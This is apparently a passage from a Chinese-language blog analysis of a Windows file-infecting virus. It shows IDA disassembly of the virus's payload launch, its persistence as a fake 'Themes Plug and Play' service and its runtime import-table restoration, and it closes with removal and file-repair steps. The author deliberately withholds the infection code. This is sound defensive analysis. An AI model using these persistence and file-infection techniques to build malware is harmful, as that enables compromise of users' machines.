.rsrc:004084C3     push    5                 ; nShowCmd
.rsrc:004084C5     push    0                 ; lpDirectory
.rsrc:004084C7     lea     ecx, [esp+820h+Data]
.rsrc:004084CB     push    offset byte_414148  ; lpParameters
.rsrc:004084D0     push    ecx               ; lpFile
.rsrc:004084D1     push    offset Operation  ; "open"
.rsrc:004084D6     push    0                 ; hwnd
.rsrc:004084D8     call    ds:ShellExecuteA    ; Opens or prints a specified file
.rsrc:004084DE
.rsrc:004084DE loc_4084DE:                   ; CODE XREF: Shell_Other_body_01+1B1 j
.rsrc:004084DE     mov     eax, edi          ; 写入%Windir%\INETINFO.exe 成功后运行该程序.
.rsrc:004084E0     pop     edi
.rsrc:004084E1     pop     esi
.rsrc:004084E2     pop     ebp
.rsrc:004084E3     pop     ebx
.rsrc:004084E4     add     esp, 808h
.rsrc:004084EA     retn
.rsrc:004084EA Shell_Other_body_01 endp
.rsrc:004084EA
.rsrc:004084EA ; ---------------------------------------------------------------------------
```

总的来说 `Shell_other_body` 函数是比较简单的，只是简单的复制/执行相关程序。

跟着来看看 `Createvirusser` 函数部分:

```
.rsrc:0040B260 ; ================ S U B R O U T I N E =======================================
.rsrc:0040B260
.rsrc:0040B260
.rsrc:0040B260 Createvirusser proc near          ; CODE XREF: sub_408020+1CE p
.rsrc:0040B260     mov     eax, ds:hSCObject
.rsrc:0040B265     push    ebx
......
.rsrc:0040B27D     push    2                 ; dwStartType
.rsrc:0040B27F     push    10h               ; dwServiceType
.rsrc:0040B281     push    0F01FFh           ; dwDesiredAccess
.rsrc:0040B286     push    offset DisplayName  ; "Themes Plug and Play"
.rsrc:0040B28B     push    offset ServiceName  ; "services"
.rsrc:0040B290     push    eax               ; hSCManager
.rsrc:0040B291     call    ds:CreateServiceA
.rsrc:0040B297     mov     ds:dword_414718, eax
.rsrc:0040B29C     test    eax, eax
.rsrc:0040B29E     mov     al, 1
.rsrc:0040B2A0     jnz     short loc_40B2A4
.rsrc:0040B2A2
.rsrc:0040B2A2 loc_40B2A2:                   ; CODE XREF: Createvirusser+A j
.rsrc:0040B2A2     mov     al, bl
.rsrc:0040B2A4
.rsrc:0040B2A4 loc_40B2A4:                   ; CODE XREF: Createvirusser+40 j
.rsrc:0040B2A4     pop     ebx
.rsrc:0040B2A5     retn
.rsrc:0040B2A5 Createvirusser endp
.rsrc:0040B2A5
.rsrc:0040B2A5 ; ---------------------------------------------------------------------------
```

这里就是病毒自启动的方式，病毒通过添加服务的方式使病毒开机后自动加载,具体服务信息如下:

- 服务名: `services`
- 服务描述: `Themes Plug and Play`
- 启动类型: `自动`
- 路径: `%system%\1021\services.exe`

病毒创建完服务之后就立刻启动病毒服务，启动服务我们最要留意就是以下相关代码:

```
.rsrc:0040818B     add     esp, 8
.rsrc:0040818E     test    eax, eax
.rsrc:00408190     jnz     short loc_4081BA    ; 如果不是则跳
.rsrc:00408192     lea     edx, [ebp+ServiceStartTable]
.rsrc:00408195     mov     [ebp+ServiceStartTable.lpServiceName], offset ServiceName ; "services"
.rsrc:0040819C     push    edx               ; lpServiceStartTable
.rsrc:0040819D     mov     [ebp+ServiceStartTable.lpServiceProc], offset loc_40B370
.rsrc:004081A4     mov     [ebp+var_8], eax
.rsrc:004081A7     mov     [ebp+var_4], eax
.rsrc:004081AA     call    ds:StartServiceCtrlDispatcherA ; 如果是病毒本身则启动病毒 服务
.rsrc:004081B0     xor     eax, eax
.rsrc:004081B2     pop     edi
.rsrc:004081B3     pop     esi
.rsrc:004081B4     mov     esp, ebp
.rsrc:004081B6     pop     ebp
.rsrc:004081B7     retn    10h
```

为什么说要注意这里呢，这里就是病毒启动服务后所要做的事，关键点在 `.lpServiceProc` 也就是 `40B370h` 处，进入几层后最终看到的病毒操作如下:

```
.rsrc:0040B1C0 ; ================ S U B R O U T I N E =======================================
.rsrc:0040B1C0
.rsrc:0040B1C0
.rsrc:0040B1C0 sub_40B1C0 proc near              ; CODE XREF: .rsrc:0040B449 p
.rsrc:0040B1C0     push    esi
.rsrc:0040B1C1     mov     esi, ds:CreateThread
.rsrc:0040B1C7     push    0                 ; lpThreadId
.rsrc:0040B1C9     push    0                 ; dwCreationFlags
.rsrc:0040B1CB     push    0                 ; lpParameter
.rsrc:0040B1CD     push    offset Infect_Drivers   ; lpStartAddress
.rsrc:0040B1D2     push    0                 ; dwStackSize
.rsrc:0040B1D4     push    0                 ; lpThreadAttributes
.rsrc:0040B1D6     call    esi ; CreateThread
.rsrc:0040B1D8     push    0                 ; lpThreadId
.rsrc:0040B1DA     push    0                 ; dwCreationFlags
.rsrc:0040B1DC     push    0                 ; lpParameter
.rsrc:0040B1DE     push    offset Server     ; lpStartAddress
.rsrc:0040B1E3     push    0                 ; dwStackSize
.rsrc:0040B1E5     push    0                 ; lpThreadAttributes
.rsrc:0040B1E7     call    esi ; CreateThread
.rsrc:0040B1E9     push    0                 ; lpThreadId
.rsrc:0040B1EB     push    0                 ; dwCreationFlags
.rsrc:0040B1ED     push    0                 ; lpParameter
.rsrc:0040B1EF     push    offset SetServiceStatu  ; 设置病毒服务为自动加载
.rsrc:0040B1F4     push    0                 ; dwStackSize
.rsrc:0040B1F6     push    0                 ; lpThreadAttributes
.rsrc:0040B1F8     call    esi ; CreateThread
.rsrc:0040B1FA     pop     esi
.rsrc:0040B1FB     retn
.rsrc:0040B1FB sub_40B1C0 endp
```

和 `Win9x` 下的相关线程差不多，只是多了个 `Setservicestatus`,实时设置病毒服务为自动加载。

接着来看看病毒还原原文件部分，我起的名字叫 `Release_File`，当时是随便写，病毒并没有释放出原程序的行为，而是直接在内存中还原原程序相关信息:

```
.rsrc:00408E20 ; ================ S U B R O U T I N E =======================================
.rsrc:00408E20
.rsrc:00408E20
.rsrc:00408E20 Release_File proc near          ; CODE XREF: sub_408020:loc_40820F p
.rsrc:00408E20
.rsrc:00408E20 NumberOfBytesWritten= dword ptr -254h
.rsrc:00408E20 var_250 = dword ptr -250h
.rsrc:00408E20 hModule = dword ptr -24Ch
.rsrc:00408E20 Buffer  = dword ptr -240h
.rsrc:00408E20 var_238 = dword ptr -238h
```



```
.rsrc:00408E20 var_234 = dword ptr -234h
.rsrc:00408E20 var_230 = dword ptr -230h
.rsrc:00408E20 var_22C = dword ptr -22Ch
.rsrc:00408E20 var_228 = dword ptr -228h
.rsrc:00408E20 var_224 = dword ptr -224h
.rsrc:00408E20 NumberOfBytesRead = dword ptr -218h
.rsrc:00408E20 var_214 = dword ptr -214h
.rsrc:00408E20 ImgBase = dword ptr -210h
.rsrc:00408E20 var_20C = dword ptr -20Ch
.rsrc:00408E20 LibFileName = byte ptr -208h
.rsrc:00408E20 var_200 = dword ptr -200h
.rsrc:00408E20 hMem    = dword ptr -1F8h
.rsrc:00408E20 var_1F4 = dword ptr -1F4h
.rsrc:00408E20 ProcName = byte ptr -1CAh
.rsrc:00408E20 var_1B8 = dword ptr -1B8h
.rsrc:00408E20
.rsrc:00408E20         sub     esp, 218h
.rsrc:00408E26         push    ebx
.rsrc:00408E27         push    ebp
.rsrc:00408E28         push    esi
.rsrc:00408E29         push    edi
.rsrc:00408E2A         push    1000h               ; uBytes
.rsrc:00408E2F         push    0                   ; uFlags
.rsrc:00408E31         call    ds:LocalAlloc
.rsrc:00408E37         push    eax                 ; hMem
.rsrc:00408E38         mov     [esp+22Ch+var_200], eax
.rsrc:00408E3C         call    ds:LocalLock
.rsrc:00408E42         mov     esi, eax
.rsrc:00408E44         test    esi, esi
.rsrc:00408E46         jnz     short loc_408E53
.rsrc:00408E48         pop     edi
.rsrc:00408E49         pop     esi
.rsrc:00408E4A         pop     ebp
.rsrc:00408E4B         pop     ebx
.rsrc:00408E4C         add     esp, 218h
.rsrc:00408E52         retn
.rsrc:00408E53 ; -------------------------------------------------------------------------
.rsrc:00408E53
.rsrc:00408E53 loc_408E53:               ; CODE XREF: Release_File+26 j
.rsrc:00408E53         push    0                   ; lpModuleName
.rsrc:00408E55         call    ds:GetModuleHandleA
.rsrc:00408E5B         mov     ebx, eax
.rsrc:00408E5D         mov     [esp+228h+ImgBase], ebx
.rsrc:00408E61         call    ds:GetCurrentProcess
.rsrc:00408E67         mov     edi, eax
.rsrc:00408E69         lea     eax, [esp+228h+NumberOfBytesRead]
.rsrc:00408E6D         push    eax                 ; lpNumberOfBytesRead
.rsrc:00408E6E         push    1000h               ; nSize
.rsrc:00408E73         push    esi                 ; lpBuffer
.rsrc:00408E74         push    ebx                 ; lpBaseAddress
.rsrc:00408E75         mov     ebx, ds:ReadProcessMemory
.rsrc:00408E7B         push    edi                 ; hProcess
.rsrc:00408E7C         call    ebx ; ReadProcessMemory
.rsrc:00408E7E         test    eax, eax            ; 读取ＰＥ头部 1000h 字节
.rsrc:00408E80         jnz     short loc_408E8D
.rsrc:00408E82         pop     edi
.rsrc:00408E83         pop     esi
.rsrc:00408E84         pop     ebp
.rsrc:00408E85         pop     ebx
.rsrc:00408E86         add     esp, 218h
.rsrc:00408E8C         retn
.rsrc:00408E8D ; -------------------------------------------------------------------------
.rsrc:00408E8D
.rsrc:00408E8D loc_408E8D:               ; CODE XREF: Release_File+60 j
.rsrc:00408E8D         mov     eax, [esi+IMAGE_DOS_HEADER.e_lfanew]
.rsrc:00408E90         xor     ecx, ecx
.rsrc:00408E92         add     eax, esi            ; 将 pe 头 rva 转为 Va
.rsrc:00408E94         push    0E0h                ; uBytes
.rsrc:00408E99         push    0                   ; uFlags
.rsrc:00408E9B         mov     cx, [eax+IMAGE_NT_HEADERS.FileHeader.NumberOfSections] ; 获取节数目
.rsrc:00408E9F         lea     ecx, [ecx+ecx*4]
.rsrc:00408EA2         mov     edx, [eax+ecx*8+0DCh]   ; 获取最后一个节的 Voffset
.rsrc:00408EA9         lea     eax, [eax+ecx*8+0D0h]   ; eax 指向最后一个节 pLastSec
.rsrc:00408EB0         mov     eax, [eax+IMAGE_SECTION_HEADER.Misc.VirtualSize] ; 获取最后一个节的 Vsize
.rsrc:00408EB3         lea     ebp, [edx+eax-10E8h]    ; ebp = (Rva + Vsize) - 10E8h
.rsrc:00408EBA         call    ds:LocalAlloc
.rsrc:00408EC0         push    eax                 ; hMem
.rsrc:00408EC1         call    ds:LocalLock
.rsrc:00408EC7         mov     edx, [esp+228h+ImgBase]
.rsrc:00408ECB         lea     ecx, [esp+228h+NumberOfBytesRead]
.rsrc:00408ECF         mov     esi, eax
.rsrc:00408ED1         push    ecx                 ; lpNumberOfBytesRead
.rsrc:00408ED2         push    0E0h                ; nSize
.rsrc:00408ED7         add     ebp, edx
.rsrc:00408ED9         push    esi                 ; lpBuffer
.rsrc:00408EDA         push    ebp                 ; lpBaseAddress
.rsrc:00408EDB         push    edi                 ; hProcess
.rsrc:00408EDC         call    ebx ; ReadProcessMemory ; 从 41700 处开始读取 0E0h 个字节
.rsrc:00408EDE         test    eax, eax            ; 41700 地址即为 (Rva + Vsize) - 10E8h + imgbase
.rsrc:00408EE0         jnz     short loc_408EED
.rsrc:00408EE2         pop     edi
.rsrc:00408EE3         pop     esi
.rsrc:00408EE4         pop     ebp
.rsrc:00408EE5         pop     ebx
.rsrc:00408EE6         add     esp, 218h           ; pPackedInfo = (Rva + Vsize) - 10e8h;
.rsrc:00408EE6                             ; $+10    OEP
.rsrc:00408EE6                             ;
.rsrc:00408EE6                             ; pDirectoryInfo = pPackedInfo + 68h
.rsrc:00408EE6                             ; pDirectoryInfo:
.rsrc:00408EE6                             ; $    Import Rva
.rsrc:00408EE6                             ; $+4   Import Size
.rsrc:00408EE6                             ; $+8   Res Rva
.rsrc:00408EE6                             ; $+C   Res Size
.rsrc:00408EEC         retn
.rsrc:00408EED ; -------------------------------------------------------------------------
.rsrc:00408EED
.rsrc:00408EED loc_408EED:               ; CODE XREF: Release_File+C0 j
.rsrc:00408EED         mov     eax, [esi+68h]
.rsrc:00408EF0         push    14h                 ; uBytes
.rsrc:00408EF2         push    0                   ; uFlags
.rsrc:00408EF4         mov     [esp+230h+var_20C], eax
.rsrc:00408EF8         call    ds:LocalAlloc       ; 这里开始处理输入表
.rsrc:00408EFE         push    eax                 ; hMem
.rsrc:00408EFF         mov     [esp+22Ch+hMem], eax ;病毒这里的处理方式其实做的有点乱，简单的来说直接读取和填充数据不就行了，还要搞个 readprocessmemory 和 writeprocessmemory。
.rsrc:00408F03         call    ds:LocalLock
.rsrc:00408F09         mov     edx, [esp+228h+var_20C]
.rsrc:00408F0D         lea     ecx, [esp+228h+NumberOfBytesRead]
.rsrc:00408F11         push    ecx                 ; lpNumberOfBytesRead
.rsrc:00408F12         mov     ecx, [esi+1Ch]
.rsrc:00408F15         mov     ebp, eax
.rsrc:00408F17         push    14h                 ; nSize
.rsrc:00408F19         add     edx, ecx
.rsrc:00408F1B         push    ebp                 ; lpBuffer
.rsrc:00408F1C         push    edx                 ; lpBaseAddress
.rsrc:00408F1D         push    edi                 ; hProcess
.rsrc:00408F1E         mov     dword ptr [esp+23Ch+LibFileName], ebp
.rsrc:00408F22         call    ebx ; ReadProcessMemory
.rsrc:00408F24         test    eax, eax
.rsrc:00408F26         jz      loc_409051
.rsrc:00408F2C         jmp     short loc_408F32
.rsrc:00408F2E ; -------------------------------------------------------------------------
.rsrc:00408F2E
```



```asm
.rsrc:00408F2E  loc_408F2E:                        ; CODE XREF: Release_File+22B j  

.rsrc:00408F2E     mov     ebp, dword ptr [esp+228h+LibFileName]  

.rsrc:00408F32  

.rsrc:00408F32  loc_408F32:                        ; CODE XREF: Release_File+10C j  

.rsrc:00408F32     mov     eax, dword ptr [esp+228h+LibFileName]  

.rsrc:00408F36     mov     ebp, [ebp+0]  

.rsrc:00408F39     test    ebp, ebp  

.rsrc:00408F3B     mov     ecx, [eax+10h]  

.rsrc:00408F3E     mov     eax, [eax+0Ch]  

.rsrc:00408F41     mov     [esp+228h+var_214], ecx  

.rsrc:00408F45     jnz     short loc_408F53  

.rsrc:00408F47     test    ecx, ecx  

.rsrc:00408F49     jnz     short loc_408F53  

.rsrc:00408F4B     test    eax, eax  

.rsrc:00408F4D     jz      Go_Next                  ; 处理完输入表后跳去执行下一步操作  

.rsrc:00408F53  

.rsrc:00408F53  loc_408F53:                        ; CODE XREF: Release_File+125 j  

.rsrc:00408F53                                      ; Release_File+129 j  

.rsrc:00408F53     lea     ecx, [esp+228h+NumberOfBytesRead]  

.rsrc:00408F57     lea     edx, [esp+228h+var_1F4]  

.rsrc:00408F5B     push    ecx  

.rsrc:00408F5C     push    64h  

.rsrc:00408F5E     push    edx  

.rsrc:00408F5F     mov     edx, [esi+1Ch]  

.rsrc:00408F62     add     eax, edx  

.rsrc:00408F64     push    eax  

.rsrc:00408F65     push    edi  

.rsrc:00408F66     call    ebx  

.rsrc:00408F68     test    eax, eax  

.rsrc:00408F6A     jz      loc_409051  

.rsrc:00408F70     lea     eax, [esp+23Ch+LibFileName]  

.rsrc:00408F74     push    eax                     ; lpLibFileName  

.rsrc:00408F75     call    ds:LoadLibraryA  

.rsrc:00408F7B     test    ebp, ebp  

.rsrc:00408F7D     mov     [esp+23Ch+var_224], eax  

.rsrc:00408F81     jnz     short loc_408F87  

.rsrc:00408F83     mov     ebp, [esp+23Ch+var_228]  

.rsrc:00408F87  

.rsrc:00408F87  loc_408F87:                        ; CODE XREF: Release_File+161 j  

.rsrc:00408F87                                      ; Release_File+204 j  

.rsrc:00408F87     lea     ecx, [esp+23Ch+var_22C]  

.rsrc:00408F8B     lea     edx, [esp+23Ch+ImgBase]  

.rsrc:00408F8F     push    ecx  

.rsrc:00408F90     push    4  

.rsrc:00408F92     push    edx  

.rsrc:00408F93     mov     edx, [esi+1Ch]  

.rsrc:00408F96     mov     eax, ebp  

.rsrc:00408F98     add     eax, edx  

.rsrc:00408F9A     push    eax  

.rsrc:00408F9B     push    edi  

.rsrc:00408F9C     call    ebx  

.rsrc:00408F9E     test    eax, eax  

.rsrc:00408FA0     jz      loc_409051  

.rsrc:00408FA6     mov     eax, [esp+250h+var_224]  

.rsrc:00408FAA     test    eax, eax  

.rsrc:00408FAC     jz      short loc_409029  

.rsrc:00408FAE     test    eax, 80000000h  

.rsrc:00408FB3     jz      short loc_408FC2  

.rsrc:00408FB5     mov     ecx, [esp+250h+var_238]  

.rsrc:00408FB9     and     eax, 7FFFFFFFh  

.rsrc:00408FBE     push    eax  

.rsrc:00408FBF     push    ecx  

.rsrc:00408FC0     jmp     short loc_408FEB  

.rsrc:00408FC2 ; -------------------------------------------  

.rsrc:00408FC2  

.rsrc:00408FC2  loc_408FC2:                        ; CODE XREF: Release_File+193 j  

.rsrc:00408FC2     lea     edx, [esp+250h+Buffer]  

.rsrc:00408FC6     lea     ecx, [esp+250h+var_1B8]  

.rsrc:00408FCD     push    edx  

.rsrc:00408FCE     mov     edx, [esi+1Ch]  

.rsrc:00408FD1     push    64h  

.rsrc:00408FD3     add     eax, edx  

.rsrc:00408FD5     push    ecx  

.rsrc:00408FD6     push    eax  

.rsrc:00408FD7     push    edi  

.rsrc:00408FD8     call    ebx  

.rsrc:00408FDA     test    eax, eax  

.rsrc:00408FDC     jz      short loc_409051  

.rsrc:00408FDE     mov     eax, [esp+264h+hModule]  

.rsrc:00408FE2     lea     edx, [esp+264h+ProcName]  

.rsrc:00408FE9     push    edx                     ; lpProcName  

.rsrc:00408FEA     push    eax                     ; hModule  

.rsrc:00408FEB  

.rsrc:00408FEB  loc_408FEB:                        ; CODE XREF: Release_File+1A0 j  

.rsrc:00408FEB     call    ds:GetProcAddress  

.rsrc:00408FF1     lea     ecx, [esp+264h+NumberOfBytesWritten]  

.rsrc:00408FF5     lea     edx, [esp+264h+Buffer]  

.rsrc:00408FF9     push    ecx                     ; lpNumberOfBytesWritten  

.rsrc:00408FFA     push    4                       ; nSize  

.rsrc:00408FFC     mov     [esp+26Ch+Buffer], eax  

.rsrc:00409000     mov     eax, [esp+26Ch+var_250]  

.rsrc:00409004     push    edx                     ; lpBuffer  

.rsrc:00409005     mov     edx, [esi+1Ch]  

.rsrc:00409008     add     eax, edx  

.rsrc:0040900A     push    eax                     ; lpBaseAddress  

.rsrc:0040900B     push    edi                     ; hProcess  

.rsrc:0040900C     call    ds:WriteProcessMemory  

.rsrc:00409012     test    eax, eax  

.rsrc:00409014     jz      short loc_409051  

.rsrc:00409016     mov     ecx, [esp+264h+var_250]  

.rsrc:0040901A     add     ecx, 4  

.rsrc:0040901D     add     ebp, 4  

.rsrc:00409020     mov     [esp+264h+var_250], ecx  

.rsrc:00409024     jmp     loc_408F87  

.rsrc:00409029 ; -------------------------------------------  

.rsrc:00409029  

.rsrc:00409029  loc_409029:                        ; CODE XREF: Release_File+18C j  

.rsrc:00409029     mov     eax, [esp+250h+var_234]  

.rsrc:0040902D     mov     edx, [esp+250h+var_230]  

.rsrc:00409031     lea     ecx, [esp+250h+Buffer]  

.rsrc:00409035     add     eax, 14h  

.rsrc:00409038     push    ecx  

.rsrc:00409039     mov     ecx, [esi+1Ch]  

.rsrc:0040903C     mov     [esp+254h+var_234], eax  

.rsrc:00409040     push    14h  

.rsrc:00409042     add     eax, ecx  

.rsrc:00409044     push    edx  

.rsrc:00409045     push    eax  

.rsrc:00409046     push    edi  

.rsrc:00409047     call    ebx  

.rsrc:00409049     test    eax, eax  

.rsrc:0040904B     jnz     loc_408F2E  

.rsrc:00409051  

.rsrc:00409051  loc_409051:                        ; CODE XREF: Release_File+106 j  

.rsrc:00409051                                      ; Release_File+14A j ...  

.rsrc:00409051     pop     edi  

.rsrc:00409052     pop     esi  

.rsrc:00409053     pop     ebp  

.rsrc:00409054     xor     eax, eax  

.rsrc:00409056     pop     ebx  

.rsrc:00409057     add     esp, 218h  

.rsrc:0040905D     retn  

.rsrc:0040905E ; -------------------------------------------  

.rsrc:0040905E  

.rsrc:0040905E  Go_Next:                             ; CODE XREF: Release_File+12D j  

.rsrc:0040905E     mov     ebx, [esp+228h+hMem]  

.rsrc:00409062     mov     edi, ds:LocalUnlock  

.rsrc:00409068     push    ebx                     ; hMem  

.rsrc:00409069     call    edi ; LocalUnlock  

.rsrc:0040906B     push    ebx                     ; hMem  

.rsrc:0040906C     mov     ebx, ds:LocalFree  

.rsrc:00409072     call    ebx ; LocalFree  

.rsrc:00409074     mov     ebp, [esp+228h+var_200]  

.rsrc:00409078     push    ebp                     ; hMem  

.rsrc:00409079     call    edi ; LocalUnlock
```



```
.rsrc:0040907B  push    ebp                       ; hMem
.rsrc:0040907C  call    ebx ; LocalFree
.rsrc:0040907E  mov     eax, [esi+10h]            ; 获取原程序入口
.rsrc:00409081  mov     ecx, [esi+1Ch]            ; 获取原程序 ImgBase
.rsrc:00409084  pop     edi
.rsrc:00409085  pop     esi
.rsrc:00409086  pop     ebp
.rsrc:00409087  add     eax, ecx
.rsrc:00409089  pop     ebx
.rsrc:0040908A  add     esp, 218h
.rsrc:00409090  retn
.rsrc:00409090 Release_File endp
```

通过上面这段代码就可以知道怎么还原感染前的文件，病毒是这样做的:

病毒感染时将原程序入口、输入表等信息保存在最后一个节中，运行感染后文件时病毒动态还原原程序的输入表等信息，执行完毕后跳去原程序入口执行原程序代码。

最后是感染部分，这部分为避免被人说俺教人写病毒，因此不贴详细分析代码，只大概的说说这病毒是怎么感染的，病毒从 `A` 盘开始枚举系统中可用分区，然后通过文件内容进行判断目标文件是否为`PE`文件，是 `pe` 文件则再判断是否为可执行体主文件(这样就过滤了驱动和 `dll` 等),然后判断文件尾是否为 `02` 标记(有 `02` 标记则病毒认为该文件已经感染病毒)。再进行文件感染，感染时病毒将自己先根据目标程序进行病毒自身的重定位(根据病毒编译时保存的重定位表来重定位)。,最后将病毒的头信息和原程序感染前的入口等信息保存在最后一个节中，再把原程序的输入表、入口等信息改成病毒的。

到这里这个病毒也就基本上分析了，总的来说，清除这病毒几分钟时间就可以搞定，加上写代码花的时间也用不了多少。不过分析完，我自己都有一个问题:那就是病毒怎么连接已中毒的机器呢？我自己还真不知道:-(。

【解决方案】:

要完美处理这个病毒，需要走两步:1、删除机器上的病毒原体；2、还原已经被感染的文件。

下面说说第一步的详细步骤:

1. 终止系统中的 `services.exe` 进程(注意是:`%system%\1021` 目录下的,系统进常路径为`%system%`);
2. 使用相关添加删除服务工具删除病毒服务;
3. 删除病毒文件`%system%\1021\services.exe`;
4. 在 `Win9x` 下则终止 `services.exe` 和 `inetinfo.exe` 进程,删除这两个文件和 `css` 文件;
5. 删除以下注册表键值:

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

键值:"ckass" = %System%\1021\services.exe

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

键值:"InetInfo" =%Windir%\InetInfo.exe
```

上面的步骤都做完了病毒原体算处理完了，接下来说说感染后文件的清除,这部分关系到编程，如果没有条件建议直接用杀毒软件清除来得快,我简单的说说原理:

清除的思路就是根据病毒还原原文件的方法，获取最后一个节的节信息，然后根据

```
pPackedInfo = (Rva + Vsize) - 10e8h;    //原程序感染前相关信息
$+10    OEP
pDirectoryInfo = pPackedInfo + 68h    //原程序感染前目录表相关信息

pDirectoryInfo:
$    Import Rva
$+4  Import Size
$+8  Res Rva
$+C  Res Size
```

还原出原程序相应信息，如果你想做的更美些就将最后一个节的信息和原病毒头信息进行运算，计算出较精确的原程序节信息。

`PS`:最近做事没状态，这东西也是分析了好多天后才整理的，希望对大家有所帮助，如果你能从头到这里那也谢谢了，最起码我的努力没有白费:-)。最后祝大家春节快乐!

`Author`: `LoveBoom`

`EMail`: `Loveboom@163.com`

`URL`: `www.Loveboom.net`

全文完
